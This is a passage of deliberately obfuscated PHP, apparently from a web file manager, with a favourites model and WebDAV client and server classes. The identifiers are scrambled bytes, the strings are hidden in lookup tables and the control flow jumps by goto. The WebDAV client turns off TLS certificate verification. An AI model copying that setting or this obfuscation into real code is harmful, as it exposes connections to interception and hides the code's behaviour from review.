$FÃÈ¨¯Ï½è[$AáÓ–£§œ[1411]] = 0; $FÃÈ¨¯Ï½è[$AáÓ–£§œ[2135]] = $this->getSort(); return parent::insert($FÃÈ¨¯Ï½è); } private function getSort() { $dƒŒ½˜ğÑ =& $_SERVER[¯Ò¬Èè]; $BÊÔ•Ò’Ÿç = parent::listData(); $EÈ—Ñ¼¶·” = array_to_keyvalue($BÊÔ•Ò’Ÿç, $dƒŒ½˜ğÑ[33], $dƒŒ½˜ğÑ[2135]); return empty($EÈ—Ñ¼¶·”) ? 0 : max($EÈ—Ñ¼¶·”) + 1; } public function update($C½éŸ¾÷Í, $DÄ¸ñª“…¯) { $b˜¢°âÙ¡¬ =& $_SERVER[¯Ò¬Èè]; $C‡­±í‚Á³ = $this->listData($C½éŸ¾÷Í); $F  •±Šß¼ = $this->findByName($DÄ¸ñª“…¯[$b˜¢°âÙ¡¬[28]]); if (!$C‡­±í‚Á³ || $F  •±Šß¼ && $F  •±Šß¼[$b˜¢°âÙ¡¬[367]] != $C‡­±í‚Á³[$b˜¢°âÙ¡¬[367]]) { return !1; } return parent::update($C½éŸ¾÷Í, $DÄ¸ñª“…¯); } public function remove($cİ˜Ô¥²¾¤, $FÁÀ‚¯¡¶Ò = false) { $d’âŞç×‡¹ =& $_SERVER[¯Ò¬Èè]; $E˜£Ì­ğâ = $this->listData($cİ˜Ô¥²¾¤); if (!$E˜£Ì­ğâ) { return; } if (!$FÁÀ‚¯¡¶Ò && $E˜£Ì­ğâ[$d’âŞç×‡¹[1089]] == $d’âŞç×‡¹[83]) { return !1; } return parent::remove($cİ˜Ô¥²¾¤); } public function enable($d”Ä¹é¹‡, $f—«œ¥»ôÃ) { return $this->update($d”Ä¹é¹‡, array($_SERVER[¯Ò¬Èè][2484] => $f—«œ¥»ôÃ)); } public function run($fÂÂä¸›À¬) { return $this->update($fÂÂä¸›À¬, array($_SERVER[¯Ò¬Èè][2495] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($fè†–´Ã‘„) { $díƒä¦Ğ =& $_SERVER[¯Ò¬Èè]; return array($díƒä¦Ğ[2496] => array(USER_ID, $díƒä¦Ğ[2497])); } protected function listData() { $EŠöÛ­°§Ñ =& $_SERVER[¯Ò¬Èè]; $eõ‰‘—¶ôĞ = array($EŠöÛ­°§Ñ[1437] => USER_ID, $EŠöÛ­°§Ñ[436] => 0); $E¹‚ƒÖµ© = $EŠöÛ­°§Ñ[2498]; $B®ê‚§òÊ = $this->field($E¹‚ƒÖµ©)->where($eõ‰‘—¶ôĞ)->order($EŠöÛ­°§Ñ[2499])->select(); return $B®ê‚§òÊ ? $B®ê‚§òÊ : array(); } protected function resetCache() { } protected function listView() { goto e¨Ş²Ëîô; DéÁ‰ÔãÑğ: $Eš©ÌÍ¨‰å = array($aÓ´µ‘Ù­­[383] => array($aÓ´µ‘Ù­­[384], $B­›ìæ¹Õ‰)); $C¹ºŠµù‚Ö = Model($aÓ´µ‘Ù­­[767])->listSource($Eš©ÌÍ¨‰å, $CİèšÏ¦ß); $C¹ºŠµù‚Ö = array_merge($C¹ºŠµù‚Ö[$aÓ´µ‘Ù­­[73]], $C¹ºŠµù‚Ö[$aÓ´µ‘Ù­­[74]]); goto fğ“Ğ˜ÄÕ†; fğ“Ğ˜ÄÕ†: $C¹ºŠµù‚Ö = array_to_keyvalue($C¹ºŠµù‚Ö, $aÓ´µ‘Ù­­[369]); foreach ($B·‘è„ Çå as $AÃ»İ…àŸÌ => $f˜Ã’·°Œï) { $AÊ‚ô¸ôù = $C¹ºŠµù‚Ö[$f˜Ã’·°Œï[$aÓ´µ‘Ù­­[75]]]; $AÊ‚ô¸ôù = $AÊ‚ô¸ôù ? $AÊ‚ô¸ôù : array(); $B·‘è„ Çå[$AÃ»İ…àŸÌ] = array_merge($AÊ‚ô¸ôù, $f˜Ã’·°Œï); } return $B·‘è„ Çå; goto dŒÜ‰·ï–‰; e¨Ş²Ëîô: $aÓ´µ‘Ù­­ =& $_SERVER[¯Ò¬Èè]; $B·‘è„ Çå = $this->listData(); $D¨·‡‘Æ†¾ = array_filter_by_field($B·‘è„ Çå, $aÓ´µ‘Ù­­[29], $aÓ´µ‘Ù­­[382]); goto dµ´¥«Ùé; dµ´¥«Ùé: $B­›ìæ¹Õ‰ = array_to_keyvalue($D¨·‡‘Æ†¾, $aÓ´µ‘Ù­­[33], $aÓ´µ‘Ù­­[75]); if (!$B­›ìæ¹Õ‰) { return $B·‘è„ Çå; } $CİèšÏ¦ß = 2000; goto DéÁ‰ÔãÑğ; dŒÜ‰·ï–‰: } protected function addFav($f„ò¿”ã‡Ñ, $FÂùŞ‰ß” = '', $F’ˆ¤Í“è¾ = "\x73\x6f\x75\x72\143\x65") { goto c¯¤êà‰ÊŸ; EŠ®ˆ«ÕÓ: $eÏ¦è¨Æ¤ = array($b²‡İö¸¼À[1437] => USER_ID, $b²‡İö¸¼À[436] => 0); $C¤Öæ¬‚ø = $this->where($eÏ¦è¨Æ¤)->max($b²‡İö¸¼À[2135]); if (!$C¤Öæ¬‚ø) { $C¤Öæ¬‚ø = 0; } goto Dá¹ÒİİìÛ; Dá¹ÒİİìÛ: if (!$FÂùŞ‰ß” && $F’ˆ¤Í“è¾ == $b²‡İö¸¼À[382]) { $e—ÜÒò‹½ö = Model($b²‡İö¸¼À[1126])->where(array($b²‡İö¸¼À[383] => $f„ò¿”ã‡Ñ))->find(); if (!$e—ÜÒò‹½ö) { return !1; } $FÂùŞ‰ß” = $e—ÜÒò‹½ö[$b²‡İö¸¼À[28]]; } $FÂùŞ‰ß” = $this->getAutoName($FÂùŞ‰ß”); $Cğ«Åò—‚ = array($b²‡İö¸¼À[1437] => USER_ID, $b²‡İö¸¼À[436] => 0, $b²‡İö¸¼À[386] => $FÂùŞ‰ß”, $b²‡İö¸¼À[387] => $f„ò¿”ã‡Ñ, $b²‡İö¸¼À[388] => $F’ˆ¤Í“è¾, $b²‡İö¸¼À[2118] => $C¤Öæ¬‚ø + 1); goto d—°‰Ô¼İØ; c¯¤êà‰ÊŸ: $b²‡İö¸¼À =& $_SERVER[¯Ò¬Èè]; $eÏ¦è¨Æ¤ = array($b²‡İö¸¼À[1437] => USER_ID, $b²‡İö¸¼À[436] => 0, $b²‡İö¸¼À[388] => $F’ˆ¤Í“è¾, $b²‡İö¸¼À[387] => $f„ò¿”ã‡Ñ); if ($this->where($eÏ¦è¨Æ¤)->find()) { return !1; } goto EŠ®ˆ«ÕÓ; d—°‰Ô¼İØ: return $this->add($Cğ«Åò—‚); goto Cšì¡×ÚÄå; Cšì¡×ÚÄå: } protected function remove($BµŞÚŞ ÁÜ) { $bŠ“ÇÏ‡‰ =& $_SERVER[¯Ò¬Èè]; $EŒåìˆíÀå = array($bŠ“ÇÏ‡‰[1437] => USER_ID, $bŠ“ÇÏ‡‰[385] => $BµŞÚŞ ÁÜ); return $this->where($EŒåìˆíÀå)->delete(); } protected function removeByName($E÷°®ô¶) { $FØœ•µˆÑ =& $_SERVER[¯Ò¬Èè]; $A¼‹ñ¡ƒ = array($FØœ•µˆÑ[1437] => USER_ID, $FØœ•µˆÑ[386] => $E÷°®ô¶, $FØœ•µˆÑ[436] => 0); return $this->where($A¼‹ñ¡ƒ)->delete(); } protected function rename($c°Í·—¬È, $A÷ŞÇÆ‹º«) { $C›Ñ––Ñˆ— =& $_SERVER[¯Ò¬Èè]; if ($c°Í·—¬È == $A÷ŞÇÆ‹º«) { return !1; } $bõíá‡ƒ› = $this->getAutoName($A÷ŞÇÆ‹º«); if ($A÷ŞÇÆ‹º« != $bõíá‡ƒ›) { return !1; } $AÑôìéæÀŒ = array($C›Ñ––Ñˆ—[1437] => USER_ID, $C›Ñ––Ñˆ—[436] => 0, $C›Ñ––Ñˆ—[28] => $c°Í·—¬È); return $this->where($AÑôìéæÀŒ)->save(array($C›Ñ––Ñˆ—[28] => $A÷ŞÇÆ‹º«)); } protected function resetSort($B’Ñ»½ïç) { $fä‡Øé‘½Û =& $_SERVER[¯Ò¬Èè]; $B’Ñ»½ïç = is_array($B’Ñ»½ïç) ? $B’Ñ»½ïç : array(); $a†°®Ãùí = array($fä‡Øé‘½Û[1437] => USER_ID); for ($bÙ½ÕùÙÉÜ = 0; $bÙ½ÕùÙÉÜ < count($B’Ñ»½ïç); $bÙ½ÕùÙÉÜ++) { $a†°®Ãùí[$fä‡Øé‘½Û[385]] = $B’Ñ»½ïç[$bÙ½ÕùÙÉÜ]; $this->where($a†°®Ãùí)->save(array($fä‡Øé‘½Û[2118] => $bÙ½ÕùÙÉÜ + 1)); } return !0; } protected function moveTop($e½­Â¸…Á¥) { goto C†ïÇŞÏÜ‘; C†ïÇŞÏÜ‘: $Bî˜ù«ˆÖ• =& $_SERVER[¯Ò¬Èè]; $b¨öÜëÒ§¸ = array($Bî˜ù«ˆÖ•[1437] => USER_ID, $Bî˜ù«ˆÖ•[436] => 0); $B¹Œâ¥ã¶™ = $this->where($b¨öÜëÒ§¸)->where(array($Bî˜ù«ˆÖ•[28] => $e½­Â¸…Á¥))->find(); goto CÅ·†±ìšİ; bÜ’…æÂ£Œ: $eâÅÖÚÛÑÜ = $b µÑË¦›; $b µÑË¦› = array_remove_value($b µÑË¦›, $B¹Œâ¥ã¶™[$Bî˜ù«ˆÖ•[367]]); array_unshift($b µÑË¦›, $B¹Œâ¥ã¶™[$Bî˜ù«ˆÖ•[367]]); goto Eôó çâ¾; CÅ·†±ìšİ: if (!$B¹Œâ¥ã¶™) { return; } $b µÑË¦› = $this->field($Bî˜ù«ˆÖ•[367])->where($b¨öÜëÒ§¸)->order($Bî˜ù«ˆÖ•[2499])->select(); $b µÑË¦› = array_to_keyvalue($b µÑË¦›, $Bî˜ù«ˆÖ•[33], $Bî˜ù«ˆÖ•[367]); goto bÜ’…æÂ£Œ; Eôó çâ¾: return $this->resetSort($b µÑË¦›); goto CĞ‹‚ùŠÍ; CĞ‹‚ùŠÍ: } protected function moveBottom($FÕ¸Ãğ¤‰æ) { $döœÂ§«ê¸ =& $_SERVER[¯Ò¬Èè]; $D½°Ÿ™øÚí = array($döœÂ§«ê¸[1437] => USER_ID, $döœÂ§«ê¸[436] => 0); $D¬ßÉø„Ã‚ = $this->where($D½°Ÿ™øÚí)->max($döœÂ§«ê¸[2135]); $eŒ§ãĞÈùË = array($döœÂ§«ê¸[2135] => $D¬ßÉø„Ã‚ + 1); return $this->where($D½°Ÿ™øÚí)->where(array($döœÂ§«ê¸[28] => $FÕ¸Ãğ¤‰æ))->save($eŒ§ãĞÈùË); } private function getAutoName($B¶šì‡ãŸÁ) { goto fÅ¢Œİ¨•¦; fÅ¢Œİ¨•¦: $Cš×£”‰çŒ =& $_SERVER[¯Ò¬Èè]; $B²‘ö„²›• = array($Cš×£”‰çŒ[1437] => USER_ID, $Cš×£”‰çŒ[436] => 0); $bªÚğàåƒø = $this->field($Cš×£”‰çŒ[28])->where($B²‘ö„²›•)->select(); goto bİùƒÒÅØ; bİùƒÒÅØ: $bªÚğàåƒø = array_to_keyvalue($bªÚğàåƒø, $Cš×£”‰çŒ[33], $Cš×£”‰çŒ[28]); if (!$bªÚğàåƒø || !in_array($B¶šì‡ãŸÁ, $bªÚğàåƒø)) { return $B¶šì‡ãŸÁ; } for ($aÑƒêø‰ = 0; $aÑƒêø‰ < count($bªÚğàåƒø); $aÑƒêø‰++) { if (!in_array($B¶šì‡ãŸÁ . "\x28{$aÑƒêø‰}\51", $bªÚğàåƒø)) { return $B¶šì‡ãŸÁ . "\50{$aÑƒêø‰}\x29"; } } goto FîêŠ«Şä; FîêŠ«Şä: return $B¶šì‡ãŸÁ . "\50{$aÑƒêø‰}\51"; goto E¸‹«µŒ¸; E¸‹«µŒ¸: } } goto AĞÊØ £Á; EÈ»ĞŸ¦¸: function beforeShutdownFatalError($AŒƒÒ¨™ø­) { think_exception($AŒƒÒ¨™ø­); } $_SERVER[$_SERVER[™‡«†³Ğ][48]] = $Dšö¥ˆ¬Æî($_SERVER[$_SERVER[™‡«†³Ğ][45]]); $c½×îŒ¢‰³ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto D¢ÕéÊ×Œ; fÉï›™–ß¤: class HttpDavClient { public function __construct($c¼‘ÌØ‚«, $aÛÀ •¨Ñ, $F¯Á£ƒ£Ÿ) { $this->header = array(); $this->userName = $aÛÀ •¨Ñ; $this->userPassowrd = $F¯Á£ƒ£Ÿ; } protected function makePath($C…Ó»ª¤§) { return $C…Ó»ª¤§; } protected function setHeader($bĞ¨Ë ˜‘, $có‰Ç†°‰Š = false) { if ($có‰Ç†°‰Š === !1) { $this->header[] = $bĞ¨Ë ˜‘; } else { $this->header[] = $bĞ¨Ë ˜‘ . $_SERVER[¯Ò¬Èè][889] . $có‰Ç†°‰Š; } } public function move($A’ÄÑšÛ‰Š, $EÀ‡Ïò¥¢œ, $dõïã¹æÑ¬ = '') { $E˜·Ÿ˜Œ£’ =& $_SERVER[¯Ò¬Èè]; $this->setHeader($E˜·Ÿ˜Œ£’[1778], $this->makePath($EÀ‡Ïò¥¢œ)); $this->setHeader($E˜·Ÿ˜Œ£’[1779], $E˜·Ÿ˜Œ£’[1780]); if ($dõïã¹æÑ¬) { $this->setHeader($E˜·Ÿ˜Œ£’[1781], $E˜·Ÿ˜Œ£’[934] . $dõïã¹æÑ¬ . $E˜·Ÿ˜Œ£’[937]); } return $this->send($E˜·Ÿ˜Œ£’[1782], $A’ÄÑšÛ‰Š); } public function copy($DŠ÷ùã™³Ã, $B·íĞ£êÇè) { $aèÃÅÜ‹·ó =& $_SERVER[¯Ò¬Èè]; $this->setHeader($aèÃÅÜ‹·ó[1778], $this->makePath($B·íĞ£êÇè)); $this->setHeader($aèÃÅÜ‹·ó[1779], $aèÃÅÜ‹·ó[1780]); return $this->send($aèÃÅÜ‹·ó[1783], $DŠ÷ùã™³Ã); } public function mkcol($C‚ó‡Ü¿ÉÔ) { $eÆÕï„âÈ =& $_SERVER[¯Ò¬Èè]; $this->setHeader($eÆÕï„âÈ[1779], $eÆÕï„âÈ[1780]); return $this->send($eÆÕï„âÈ[1784], $C‚ó‡Ü¿ÉÔ); } public function delete($cÙÛ‘ˆôÓí, $Cª†›öÉ±Å = '') { $CÇê¿§‰ó =& $_SERVER[¯Ò¬Èè]; if ($Cª†›öÉ±Å) { $this->setHeader($CÇê¿§‰ó[1781], $CÇê¿§‰ó[934] . $Cª†›öÉ±Å . $CÇê¿§‰ó[937]); } return $this->send($CÇê¿§‰ó[1259], $cÙÛ‘ˆôÓí); } public function propfind($côÒ­ä¯¼“) { $f”®ˆ„™¶ =& $_SERVER[¯Ò¬Èè]; $this->setHeader($f”®ˆ„™¶[1785], $f”®ˆ„™¶[83]); $this->setHeader($f”®ˆ„™¶[1786], $f”®ˆ„™¶[1787]); $Cî¦ø«ßôï = $f”®ˆ„™¶[1788]; return $this->send($f”®ˆ„™¶[1789], $côÒ­ä¯¼“, $Cî¦ø«ßôï); } public function options($CÉõ¤ÏÂß) { return $this->send($_SERVER[¯Ò¬Èè][1790], $CÉõ¤ÏÂß); } public function get($b¸Ñ°·­¤´) { return $this->send($_SERVER[¯Ò¬Èè][216], $b¸Ñ°·­¤´); } public function put($E÷Ë‘ˆ®Ÿ˜, $d«Ğ—¶óˆ, $cïæ„ª´ì = '') { $A×¼í•´— =& $_SERVER[¯Ò¬Èè]; if ($cïæ„ª´ì) { $this->setHeader($A×¼í•´—[1781], $A×¼í•´—[934] . $cïæ„ª´ì . $A×¼í•´—[937]); } return $this->send($A×¼í•´—[214], $E÷Ë‘ˆ®Ÿ˜, $d«Ğ—¶óˆ); } protected function send($béÛèŠõ…ç, $bßŠö£é¿÷, $bß¨ÂÅ‹ö‚ = false, $FŸ’Œêä… = false) { goto cÓßßª‘ñ½; b‰¡•¿¨Ñ³: $this->setHeader($D°„¾Ò„¯ˆ); if ($bß¨ÂÅ‹ö‚) { $bß¨ÂÅ‹ö‚ = $a»…¬ÃˆË[1792] . $bß¨ÂÅ‹ö‚; } if (!request_url_safe($bßŠö£é¿÷)) { return !1; } goto C¸Á±èŠÕ¼; cÓßßª‘ñ½: $a»…¬ÃˆË =& $_SERVER[¯Ò¬Èè]; $D°„¾Ò„¯ˆ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($a»…¬ÃˆË[1791], $a»…¬ÃˆË[50]); goto b‰¡•¿¨Ñ³; a¦¸ß°±å: $this->header = array(); return $e’ˆãÊ»•‹; goto F‹’—¿ˆÃÆ; C«ğ­ß¤¤¥: curl_setopt($A­¹«ÁèÌµ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($A­¹«ÁèÌµ, CURLOPT_SSL_VERIFYHOST, !1); $e’ˆãÊ»•‹ = curl_exec($A­¹«ÁèÌµ); goto a¦¸ß°±å; C¸Á±èŠÕ¼: $A­¹«ÁèÌµ = curl_init($bßŠö£é¿÷); curl_setopt($A­¹«ÁèÌµ, CURLOPT_CUSTOMREQUEST, $béÛèŠõ…ç); curl_setopt($A­¹«ÁèÌµ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto dª¨ùÎÀÑØ; dª¨ùÎÀÑØ: curl_setopt($A­¹«ÁèÌµ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($A­¹«ÁèÌµ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($A­¹«ÁèÌµ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto C«ğ­ß¤¤¥; F‹’—¿ˆÃÆ: } } class HttpDavServer { public function __construct($D¡éÈÉŒ¤º, $EÍ†Š÷ÁÒ) { $this->root = $D¡éÈÉŒ¤º; $this->initPath($EÍ†Š÷ÁÒ); $this->start(); } public function initPath($CÁ¢âÓÙ³) { $c¥ÍñÖµ§Î =& $_SERVER[¯Ò¬Èè]; $EİìÏ×ƒ = rtrim($_SERVER[$c¥ÍñÖµ§Î[1397]], $c¥ÍñÖµ§Î[8]) . $c¥ÍñÖµ§Î[8]; $this->urlBase = substr($EİìÏ×ƒ, 0, strpos($EİìÏ×ƒ, $CÁ¢âÓÙ³) + 1); $this->urlBase = rtrim($this->urlBase, $c¥ÍñÖµ§Î[8]) . $CÁ¢âÓÙ³; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $A‡öãº½ä­ =& $_SERVER[¯Ò¬Èè]; $dëŸ•ø°¼½ = HttpAuth::get(); if ($dëŸ•ø°¼½[$A‡öãº½ä­[544]] == $A‡öãº½ä­[1793] && $dëŸ•ø°¼½[$A‡öãº½ä­[906]] == $A‡öãº½ä­[1794]) { return !0; } HttpAuth::error(); } public function start() { goto c—‚¯ÆÊ‰; c—‚¯ÆÊ‰: $bö˜¦éªçº =& $_SERVER[¯Ò¬Èè]; $this->checkUser(); $EÍÓˆ°Ó‹è = $bö˜¦éªçº[144] . HttpHeader::method(); goto A°¯õ÷„ë¬; Bæ½Ä‚âÑ„: if (!$F°¼ô„†«È) { return; } self::response($F°¼ô„†«È); goto dÏÚ© ˆ¸–; A°¯õ÷„ë¬: if (!method_exists($this, $EÍÓˆ°Ó‹è)) { pr($EÍÓˆ°Ó‹è . $bö˜¦éªçº[1795]); die; } $bÒˆø‚òÆ‹ = array($bö˜¦éªçº[1796], $bö˜¦éªçº[1797]); if (!in_array($EÍÓˆ°Ó‹è, $bÒˆø‚òÆ‹) && !$this->pathExists($this->path)) { $F°¼ô„†«È = array($bö˜¦éªçº[1041] => 404); } else { $F°¼ô„†«È = $this->{$EÍÓˆ°Ó‹è}(); } goto Bæ½Ä‚âÑ„; dÏÚ© ˆ¸–: } public function pathGet($E°Æ®ÕÀù– = false) { $C£ªŞíğÑ =& $_SERVER[¯Ò¬Èè]; $B…§ŒÊæé = $E°Æ®ÕÀù– ? $_SERVER[$C£ªŞíğÑ[1798]] : $_SERVER[$C£ªŞíğÑ[1397]]; $B…§ŒÊæé = KodIO::clear(rawurldecode($B…§ŒÊæé)); if (!strstr($B…§ŒÊæé, KodIO::clear($this->urlBase))) { return !1; } return substr($B…§ŒÊæé, strpos($B…§ŒÊæé, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($a‡½ó¶µå‚) { return file_exists($a‡½ó¶µå‚); } public function pathMkdir($D«¸¨†éÅğ) { return mkdir($D«¸¨†éÅğ, 511, !0); } public function pathInfo($dÏæ¢—™ƒ‰) { return path_info($dÏæ¢—™ƒ‰); } public function pathList($CËô“˜Ÿ´Õ) { return path_list($CËô“˜Ÿ´Õ); } public function pathOut($eÎæ—ÀŞ‹˜) { echo file_get_contents($eÎæ—ÀŞ‹˜); } public function pathPut($cİæ­œ‡»£, $Fì³‰¡İ¥ = '') { if (!$Fì³‰¡İ¥) { return file_put_contents($cİæ­œ‡»£, $_SERVER[¯Ò¬Èè][33]); } return move_path($Fì³‰¡İ¥, $cİæ­œ‡»£); } public function pathRemove($aÌÊÅï¹ù¨) { if (is_file($aÌÊÅï¹ù¨)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bˆÄº¡ ÎÈ, $aõ¶Œ¹‰®) { return move_path($bˆÄº¡ ÎÈ, $aõ¶Œ¹‰®); } public function pathCopy($DŞ”äè±‰¥, $A‹«àâéù) { return copy_dir($DŞ”äè±‰¥, $A‹«àâéù); } public function parsePath($b‘Ùºøæ³«) { return $b‘Ùºøæ³«; } public function parseItem($FñÉçñÕÓŒ, $BÚ™“…Ó‡¿) { goto Cœğ¸‹“Ş„; Cááó¢ÓİÅ: if ($BÚ™“…Ó‡¿) { $F»òËÏëŠ§ = $DÕìŸÖƒ¦Ô[8] . str_replace($DÕìŸÖƒ¦Ô[172], $DÕìŸÖƒ¦Ô[8], rawurlencode($this->pathGet())); } if (!trim($FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[107]])) { $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[107]] = time(); } if (!trim($FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[187]])) { $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[187]] = time(); } goto D¥Ğ†Œ‹µ…; Cœğ¸‹“Ş„: $DÕìŸÖƒ¦Ô =& $_SERVER[¯Ò¬Èè]; $F»òËÏëŠ§ = $this->pathGet() . $DÕìŸÖƒ¦Ô[8] . $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[28]]; $F»òËÏëŠ§ = $DÕìŸÖƒ¦Ô[8] . str_replace($DÕìŸÖƒ¦Ô[172], $DÕìŸÖƒ¦Ô[8], rawurlencode($F»òËÏëŠ§)); goto Cááó¢ÓİÅ; D¥Ğ†Œ‹µ…: $c‰‹Í†œöÉ = array($DÕìŸÖƒ¦Ô[1799] => KodIO::clear($this->urlBase . $F»òËÏëŠ§), $DÕìŸÖƒ¦Ô[107] => @gmdate($DÕìŸÖƒ¦Ô[1800], $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[107]]), $DÕìŸÖƒ¦Ô[187] => @gmdate($DÕìŸÖƒ¦Ô[1801], $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[187]]), $DÕìŸÖƒ¦Ô[77] => $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[77]] ? $FñÉçñÕÓŒ[$DÕìŸÖƒ¦Ô[77]] : 0); return $c‰‹Í†œöÉ; goto EÇºÓˆ¡¥Ş; EÇºÓˆ¡¥Ş: } public function parseItemXml($A›ò½¨¤ÆÛ, $AÊ×î™°œ—) { $AÕ®ÛŠ’¿‘ =& $_SERVER[¯Ò¬Èè]; $fÚãĞ›Š¶¤ = $this->parseItem($A›ò½¨¤ÆÛ, $AÊ×î™°œ—); if ($A›ò½¨¤ÆÛ[$AÕ®ÛŠ’¿‘[29]] == $AÕ®ÛŠ’¿‘[76]) { $Aéñô«ˆéã = $AÕ®ÛŠ’¿‘[1802]; $Aéñô«ˆéã .= $AÕ®ÛŠ’¿‘[1803]; } else { $Dáø¥±Ÿ“ = $A›ò½¨¤ÆÛ[$AÕ®ÛŠ’¿‘[160]] ? $A›ò½¨¤ÆÛ[$AÕ®ÛŠ’¿‘[160]] : get_path_ext($A›ò½¨¤ÆÛ[$AÕ®ÛŠ’¿‘[28]]); $eÖ†¹ğŒÄğ = get_file_mime($Dáø¥±Ÿ“); $Aéñô«ˆéã = $AÕ®ÛŠ’¿‘[1804]; $Aéñô«ˆéã .= "\x3c\x44\x3a\x67\x65\x74\x63\x6f\156\x74\145\x6e\x74\x74\171\x70\145\76{$eÖ†¹ğŒÄğ}\74\x2f\104\72\x67\145\x74\x63\157\x6e\164\145\156\164\x74\x79\160\x65\76"; } return "\12\11\11\74\x44\x3a\x72\145\163\160\157\156\x73\145\x3e\12\11\11\x9\74\104\72\150\x72\145\x66\76{$fÚãĞ›Š¶¤[$AÕ®ÛŠ’¿‘[1799]]}\x3c\x2f\104\x3a\150\x72\x65\x66\76\xa\x9\11\11\x3c\104\72\x70\162\157\160\163\164\141\164\x3e\xa\11\x9\x9\x9\74\x44\x3a\160\x72\x6f\x70\76\12\11\11\x9\x9\x9\74\x44\72\x67\x65\x74\x6c\x61\x73\x74\155\x6f\144\x69\x66\x69\145\x64\76{$fÚãĞ›Š¶¤[$AÕ®ÛŠ’¿‘[107]]}\74\x2f\104\x3a\147\x65\164\x6c\141\163\x74\x6d\157\x64\151\x66\x69\x65\x64\x3e\xa\x9\11\11\11\11\74\104\72\x63\x72\x65\141\x74\151\157\156\144\x61\x74\x65\76{$fÚãĞ›Š¶¤[$AÕ®ÛŠ’¿‘[187]]}\x3c\x2f\x44\72\143\x72\x65\x61\x74\x69\x6f\x6e\x64\x61\164\145\x3e\12\11\x9\11\x9\x9\x3c\x44\72\147\145\164\143\157\156\x74\145\156\164\154\x65\x6e\x67\x74\x68\x3e{$fÚãĞ›Š¶¤[$AÕ®ÛŠ’¿‘[77]]}\74\x2f\104\x3a\147\145\x74\143\x6f\156\164\145\x6e\x74\154\145\x6e\147\164\x68\x3e\xa\x9\11\11\x9\x9{$Aéñô«ˆéã}\xa\x9\x9\11\11\74\57\104\x3a\x70\162\157\160\x3e\12\11\x9\x9\11\74\104\x3a\x73\x74\x61\164\x75\x73\76\110\124\x54\120\x2f\61\56\61\40\x32\x30\x30\x20\x4f\x4b\x3c\x2f\104\72\163\x74\x61\164\x75\163\76\12\x9\11\x9\74\x2f\104\x3a\160\162\x6f\160\x73\164\x61\164\x3e\xa\11\x9\x3c\57\x44\x3a\x72\x65\163\x70\157\x6e\163\145\76"; } public function pathListMerge($B„ÇçœìŸŒ) { goto E’ïÎ»òäµ; E’ïÎ»òäµ: $D•¾å÷ñ—‹ =& $_SERVER[¯Ò¬Èè]; if (!$B„ÇçœìŸŒ) { return $B„ÇçœìŸŒ; } $bñ»Ê‡˜Ã‚ = array($D•¾å÷ñ—‹[73], $D•¾å÷ñ—‹[74], $D•¾å÷ñ—‹[1805]); goto E‰©ä‘ÓÛ; bÏ’ê´øÅ: return $C³Á×øö¶¦; goto B³«´–‰äµ; E‰©ä‘ÓÛ: $C³Á×øö¶¦ = array(); foreach ($B„ÇçœìŸŒ as $e”¦®Şà‡‡ => $E¶»‰¦¾Òó) { if (!in_array($e”¦®Şà‡‡, $bñ»Ê‡˜Ã‚) || !is_array($E¶»‰¦¾Òó)) { continue; } $C³Á×øö¶¦ = array_merge($C³Á×øö¶¦, $E¶»‰¦¾Òó); } foreach ($C³Á×øö¶¦ as &$d„›•ùØ) { $d„›•ùØ[$D•¾å÷ñ—‹[28]] = str_replace($D•¾å÷ñ—‹[8], $D•¾å÷ñ—‹[1399], $d„›•ùØ[$D•¾å÷ñ—‹[28]]); } goto bÏ’ê´øÅ; B³«´–‰äµ: } public function httpPROPFIND() { goto aÌää¿†³ë; A¹‹ÕÎİ„: if ($AŸÆ˜ËÌêù) { $BêÛ „×Œ = array($EÈ§¸Å¹); } else { $EÈ§¸Å¹[$a†‚ÆˆŒ¿[28]] = $a†‚ÆˆŒ¿[33]; $BêÛ „×Œ = array_merge(array($EÈ§¸Å¹), $BêÛ „×Œ); } $aÀ¦”ÂŸÌš = $a†‚ÆˆŒ¿[33]; foreach ($BêÛ „×Œ as $b¹ç•õˆãŠ) { $aÀ¦”ÂŸÌš .= $this->parseItemXml($b¹ç•õˆãŠ, $AŸÆ˜ËÌêù); } goto EÈ„‡±ŠÀƒ; aÌää¿†³ë: $a†‚ÆˆŒ¿ =& $_SERVER[¯Ò¬Èè]; $A¥ù¥š›Œ = $this->pathList($this->path); $BêÛ „×Œ = $this->pathListMerge($A¥ù¥š›Œ); goto c¬²Ÿ´îÍë; EÈ„‡±ŠÀƒ: return array($a†‚ÆˆŒ¿[1808] => 207, $a†‚ÆˆŒ¿[1809] => "\x3c\x44\x3a\155\165\154\164\151\163\164\141\164\165\163\x20\170\x6d\154\156\x73\x3a\104\75\x22\104\x41\x56\x3a\x22\x3e\xa{$aÀ¦”ÂŸÌš}\12\74\57\104\72\155\x75\x6c\164\151\x73\164\141\164\x75\x73\x3e"); goto CŠøÌİŸŒ; c¬²Ÿ´îÍë: $EÈ§¸Å¹ = $A¥ù¥š›Œ[$a†‚ÆˆŒ¿[1806]]; if (!is_array($BêÛ „×Œ) || $EÈ§¸Å¹[$a†‚ÆˆŒ¿[1807]] === !1) { return array($a†‚ÆˆŒ¿[1808] => 404, $a†‚ÆˆŒ¿[1809] => $a†‚ÆˆŒ¿[1810]); } $AŸÆ˜ËÌêù = $EÈ§¸Å¹[$a†‚ÆˆŒ¿[29]] == $a†‚ÆˆŒ¿[167] || HttpHeader::get($a†‚ÆˆŒ¿[1785]) == $a†‚ÆˆŒ¿[468]; goto A¹‹ÕÎİ„; 